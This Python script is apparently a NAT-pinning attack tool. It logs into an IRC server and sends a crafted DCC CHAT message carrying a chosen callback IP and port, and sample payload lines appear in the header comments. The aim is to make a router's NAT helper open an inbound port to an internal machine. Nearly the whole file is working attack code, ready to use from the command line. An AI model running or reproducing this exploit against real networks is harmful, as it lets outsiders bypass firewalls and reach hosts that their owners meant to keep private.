#!/usr/bin/env python
from optparse import OptionParser
from threading import Thread
import random
import socket
import struct


#Natpinnging via:
#PRIVMSG natpin809 :.DCC CHAT chat 3232236148 35486.
#PRIVMSG natpin809 :.DCC SEND chat 3232236148 35486.



IRC_NICK = "natpin" + str(random.randint(1, 1000))
IRC_BOUNCE_NICK="raf"
CALLBACK_PORT= 8080
CALLBACK_IP = "192.168.0.198"


class IRCClient():
	class serverMSG():
		def __init__(self, msg):
			self.Ok = 0
			self.Connected = 0
			#print "RAW = " + msg
			parts = msg.split(" ",3)
			if len(parts) == 4 :
				self.Server = parts[0].replace(":","",1)
				self.Type = parts[1]
				self.SubType = parts[2]
				self.Val= parts[3]
				self.Ok =1
			elif parts[0] == "PING":
				self.Server= ""
				self.Type="PING"
				self.SubType=""
				self.Val= parts[1]
				self.Ok=1	
	#end class
	def __init__(self, server, port=6667):
		self.IRCServer = server
		self.IRCPort = port
		self.connect()
	#end def
	def receivemsg(self):
		while 1:
			indata = self.s.recv(1024).split('\r\n')
			for line in indata:
				x = self.serverMSG(line)
				if x.Ok==1: self.handlemsg(x)
	#end def
	def handlemsg(self,servermsg):
		if servermsg.Type== "NOTICE" and servermsg.SubType=="AUTH":
			self.s.send("NICK "+IRC_NICK+"\r\n")
			self.s.send("USER "+IRC_NICK+" "+IRC_NICK+" "+self.IRCServer+" :"+IRC_NICK+"\r\n")
		elif servermsg.Type=="PING":
			self.s.send("PONG " + servermsg.Val + "\r\n")
			print "PING/PONG"
		elif servermsg.Type==("376"):
			print "end of motd"
			self.Connected = 1
			self.s.send("JOIN #xyz\r\n")
			self.DCCChat("raf",CALLBACK_IP, CALLBACK_PORT)
	#end def
	def DCCChat(self, nick, IPAddress, port):
		intIP = struct.unpack("!I", socket.inet_aton(IPAddress))[0]
		self.s.send("PRIVMSG " +nick + " :"+chr(0x01)+"DCC CHAT chat " + str(intIP) + " " + str(port) + chr(0x01)+"\r\n")
		print "DCC CHAT SEND, try to connect from remote host to " + IPAddress + ":" + str(port)
	#end def
	def connect(self):
		if self.IRCServer != "" and self.IRCPort !=0:
			self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		
			self.s.connect((self.IRCServer,self.IRCPort))
			self.sockThread = Thread(target=self.receivemsg)
			self.sockThread.start()
	#end def
#end class

parser = OptionParser()
parser.add_option('-s','--server', dest="ircserver", help="IRC server")
parser.add_option('-i','--ip', dest="callbackip",help="IP to call back on")
parser.add_option('-p','--port', dest="callbackport",help="Port to call back on")

(opts,args) =parser.parse_args()
if (opts.ircserver is None) or (opts.callbackip is None) or (opts.callbackport is None):
	print "Invalid args, add -h for options"
else:
	CALLBACK_PORT= int(opts.callbackport)
	CALLBACK_IP = opts.callbackip
	x = IRCClient(opts.ircserver)
#x = IRCClient("127.0.0.1")

